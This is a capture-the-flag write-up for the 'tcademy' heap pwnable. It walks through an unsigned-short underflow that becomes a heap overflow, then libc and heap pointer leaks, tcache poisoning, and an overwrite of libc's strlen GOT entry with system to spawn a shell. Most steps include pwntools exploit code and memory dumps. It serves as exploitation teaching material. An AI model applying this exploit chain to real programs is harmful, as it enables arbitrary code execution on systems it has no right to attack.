# tcademy (Upsolved)

## 1. Summary

- **Category**: Pwnable

### Description

> `I'm telling you, tcache poisoning doesn't just happen due to double-frees!`

## 2. Analysis

### Checksec

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Vulnerability

- **Functionality**:
  There is a feature to create chunks of size `0 ~ 0xf8`.
- **Vulnerability Detail**:
  `read_data_into_note` sets `resized_size` to be smaller than the user-defined size to prevent overflows. However, since the type of `resized_size` is `unsigned short`, if the `size` is less than 8, it becomes a negative value and causes an underflow. This leads to a **Heap Buffer Overflow**, which seemed to be the key to solving the challenge.
- **Constraints**:
  Since `notes` can only store up to 2 chunks at a time, it is impossible to fill the tcache bins (which can hold up to 7) to trigger an Unsorted Bin leak normally.

## 3. Exploit Flow

1. **Space Allocation and Unsorted Bin Trigger**
   Chunks were allocated and deleted in 0x10 increments to create extra space. By manipulating the size to be larger than `0x410` (so it doesn't go into tcache) and calling `delete_note`, the chunk is placed into the **unsorted bin**, and the `main_arena` address is recorded. The key is to leave one chunk at the end so it doesn't merge with the top chunk.

   ```python
    for i in range(0x10, 0x90, 0x10):
        create_note(r, 0, i, b"A")
        create_note(r, 1, i, b"A")
        delete_note(r, 1)
        delete_note(r, 0)

    create_note(r, 0, 0, b"A")
    create_note(r, 1, 0, b"A")
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x18 + p16(0x4D1))
    delete_note(r, 1)
   ```

   **Memory State:**

   ```text
   Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
       [0x0000555555559010     00 00 02 00 02 00 02 00 02 00 02 00 02 00 02 00    ................]
   Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
       [0x00005555555592a0     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
   Chunk(addr=0x5555555592c0, size=0x4d0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
       [0x00005555555592c0     e0 ec 4f 55 55 15 00 00 e0 ec 4f 55 55 15 00 00    ..OUU.....OUU...]
   Chunk(addr=0x555555559790, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
       [0x0000555555559790     59 55 55 55 05 00 00 00 81 0e 3e 40 fa 0e 2a 5a    YUUU......>@..*Z]
   Chunk(addr=0x555555559820, size=0x207f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
   ```

2. **Libc Leak**
   Afterwards, free and reallocate the `0x2a0` chunk, fill it with `0x20` bytes, and print the note. The `main_arena` address is printed, and the `libc.address` is calculated by subtracting the offset.

   ```python
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x20)
    print_note(r, 0)

    r.recvuntil(b"A" * 0x20)
    main_arena = u64(r.recvline().rstrip().ljust(8, b"\0"))
    libc.address = main_arena - MAIN_ARENA_OFFSET
   ```

   **Memory State:**

   ```text
   0x555555559290: 0x0000000000000000      0x0000000000000021
   0x5555555592a0: 0x4141414141414141      0x4141414141414141
   0x5555555592b0: 0x4141414141414141      0x4141414141414141
   0x5555555592c0: 0x00001555554fece0      0x00001555554fece0
   ```

3. **Heap Leak (Mangler)**
   This time, fill with `0x70` bytes and print to leak the `heap_address >> 12` value (mangler). By XORing this with a target address, the next allocation will point to that address.

   ```python
    delete_note(r, 0)
    create_note(r, 0, 0, b"A" * 0x70)
    print_note(r, 0)
    r.recvuntil(b"A" * 0x70)
    mangler = u64(r.recvline().rstrip().ljust(8, b"\0"))
   ```

   **Memory State:**

   ```text
   0x555555559290: 0x0000000000000000      0x0000000000000021
   ...
   0x555555559310: 0x0000000555555559      0x5a2a0efa403e0e81
   ```

4. **Tcache Poisoning & Libc GOT Overwrite**
   I was stuck on how to proceed, but checking the [official write-up](https://github.com/uclaacm/lactf-archive/blob/main/2026/pwn/tcademy/solve.py) later revealed a Libc GOT overwrite technique. In the provided Docker environment, `libc.so.6` was **Partial RELRO**.
   `print_note` calls `puts`, which internally calls `strlen`. By overwriting `libc.got.strlen` with `libc.sym.system` and passing `"/bin/sh"`, we can get a shell. Since `libc.got.strlen` ends in 8, we align it by targeting `libc.got.strncpy` (ending in 0).

   ```python
    target = mangler ^ libc.got.strncpy
    payload = flat(b"A" * 0x18, p64(0x4D1), b"A" * 0x18, p64(0x31), p64(target))
    create_note(r, 0, 0, payload)
   ```

   **Memory State & Tcachebins:**

   ```text
   0x5555555592e0: 0x00001550001ab5c9      0x4141414141414141

   Tcachebins[idx=1, size=0x30, count=2] ← Chunk(addr=0x5555555592e0...) ← Chunk(addr=0x1555554fe090...)
   ```

5. **Final Execution**
   The `0x5555555592e0` chunk is allocated to store `"/bin/sh"`, making the next Tcache chunk address `libc.got.strncpy`. Overwrite `strlen` with `system` and call `print_note` to get the shell.

   ```python
    delete_note(r, 0)
    create_note(r, 0, 0x20, b"/bin/sh\0")
    create_note(r, 1, 0x20, p64(libc.sym.strncpy) + p64(libc.sym.system))
    print_note(r, 0)
   ```

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Conclusion

It was regrettable to miss this solve during the competition. Had I correctly identified the Partial RELRO status of the server's Libc, I could have transitioned from the heap overflow to the GOT overwrite much sooner. This highlights the importance of environmental reconnaissance in pwn challenges.
